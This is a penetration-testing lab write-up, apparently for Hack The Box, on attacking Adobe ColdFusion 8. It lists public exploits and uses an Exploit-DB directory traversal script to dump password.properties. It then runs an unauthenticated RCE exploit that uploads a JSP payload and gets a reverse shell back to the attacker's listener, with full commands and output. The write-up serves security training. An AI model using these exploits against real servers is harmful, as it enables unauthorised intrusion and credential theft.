# Attacking ColdFusion
## Searchsploit

```sh
$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Directory Traversal
The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like **database connections**, **mail servers**, **LDAP servers**, and other resources that require authentication. 

```sh
$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

## Unauthenticated RCE

```sh
$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

A quick `cat` review of the code indicates that the script needs some information. Set the correct information and launch the exploit.

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

Reverse shell:

```sh
$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


        <script type="text/javascript">
            window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
        </script>
    

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

## Questions
1. What user is ColdFusion running as? **Answer: arctic\tolis**
   - Start a nmap scan, found ColdFusion default port running:
        ```sh
        $ sudo nmap -Pn -sV -sC -p- -T4 10.129.62.152
        Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-25 23:38 EDT
        Nmap scan report for 10.129.62.152
        Host is up (0.17s latency).
        Not shown: 65532 filtered tcp ports (no-response)
        PORT      STATE SERVICE VERSION
        135/tcp   open  msrpc   Microsoft Windows RPC
        8500/tcp  open  http    JRun Web Server
        |_http-title: Index of /
        49154/tcp open  msrpc   Microsoft Windows RPC
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        ```
   - Navigate to http://10.129.62.152:8500/CFIDE/administrator/, notice target running ColdFusion 8, search for public exploits:
        ```sh
        $ searchsploit adobe coldfusion
        ---------------------------------------------- ---------------------------------
        Exploit Title                                |  Path
        ---------------------------------------------- ---------------------------------
        <SNIP>
        Adobe ColdFusion 8 - Remote Command Execution | cfm/webapps/50057.py
        <SNIP>
        ```
   - Copy the exploit and modify it to gain a reverse shell:
        ```sh
        $ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
        $ cat 50057.py
        <SNIP>
        if __name__ == '__main__':
            # Define some information
            lhost = '10.10.16.4'
            lport = 4444
            rhost = "10.10.10.11"
            rport = 8500
            filename = uuid.uuid4().hex
        <SNIP>
        $ python 5007.py
        <SNIP>
        Printing some information for debugging...
        lhost: 10.10.14.149
        lport: 4444
        rhost: 10.129.62.152
        rport: 8500
        payload: 91a7bb2ebc2942e895a31d516c19acfa.jsp

        Deleting the payload...

        Listening for connection...

        Executing the payload...
        Listening on 0.0.0.0 4444
        Connection received on 10.129.62.152 49302







        Microsoft Windows [Version 6.1.7600]
        Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

        C:\ColdFusion8\runtime\bin>whoami
        whoami
        arctic\tolis
        ```
   - 